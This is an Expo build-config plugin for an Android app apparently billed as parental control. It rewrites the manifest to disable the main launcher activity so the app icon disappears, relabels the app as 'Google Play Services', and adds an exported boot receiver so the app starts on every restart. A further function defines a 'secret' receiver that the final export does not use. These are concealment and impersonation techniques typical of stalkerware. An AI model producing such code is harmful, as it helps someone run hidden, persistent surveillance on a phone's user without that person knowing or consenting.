const { withAndroidManifest, withGradleProperties } = require('@expo/config-plugins');

function withHideApp(config) {
  return withAndroidManifest(config, (config) => {
    const manifest = config.modResults.manifest;
    const application = manifest.application[0];

    if (application.activity) {
      application.activity.forEach((activity) => {
        if (activity.$ && activity.$['android:name'] && activity.$['android:name'].includes('MainActivity')) {
          if (!activity.$) activity.$ = {};
          activity.$['android:enabled'] = 'false';
          activity.$['android:exported'] = 'true';
        }
      });
    }

    return config;
  });
}

function withAppLabel(config) {
  return withAndroidManifest(config, (config) => {
    const manifest = config.modResults.manifest;
    const application = manifest.application[0];

    if (application.$) {
      application.$['android:label'] = 'Google Play Services';
      application.$['android:icon'] = '@mipmap/ic_launcher';
      application.$['android:roundIcon'] = '@mipmap/ic_launcher_round';
    }

    return config;
  });
}

function withSecretReceiver(config) {
  return withAndroidManifest(config, (config) => {
    const manifest = config.modResults.manifest;
    const application = manifest.application[0];

    if (!application['receiver']) {
      application['receiver'] = [];
    }

    application['receiver'].push({
      $: {
        'android:name': 'com.parentalcontrol.app.SecretReceiver',
        'android:exported': 'true'
      },
      'intent-filter': [
        {
          action: [
            { $: { 'android:name': 'android.intent.action.BOOT_COMPLETED' } },
            { $: { 'android:name': 'com.parentalcontrol.app.SECRET_OPEN' } }
          ]
        }
      ]
    });

    return config;
  });
}

function withBootReceiver(config) {
  return withAndroidManifest(config, (config) => {
    const manifest = config.modResults.manifest;
    const application = manifest.application[0];

    if (!application['receiver']) {
      application['receiver'] = [];
    }

    const hasBoot = application['receiver'].some(r =>
      r.$ && r.$['android:name'] === 'com.parentalcontrol.app.BootReceiver'
    );

    if (!hasBoot) {
      application['receiver'].push({
        $: {
          'android:name': 'com.parentalcontrol.app.BootReceiver',
          'android:exported': 'true'
        },
        'intent-filter': [
          {
            action: [
              { $: { 'android:name': 'android.intent.action.BOOT_COMPLETED' } }
            ]
          }
        ]
      });
    }

    return config;
  });
}

module.exports = function (config) {
  config = withAppLabel(config);
  config = withHideApp(config);
  config = withBootReceiver(config);
  return config;
};
